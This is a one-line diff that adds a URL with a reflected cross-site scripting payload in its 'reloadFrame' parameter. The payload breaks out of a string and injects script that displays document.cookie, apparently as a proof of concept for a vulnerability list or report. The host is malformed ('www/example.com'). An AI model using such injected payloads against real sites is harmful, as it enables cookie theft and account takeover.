@@ -1,0 +1,1 @@
+https://www/example.com/wa/auth?&authmech=Assess&reloadFrame=%22;%3Cscript%3Eblah%3C/script%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
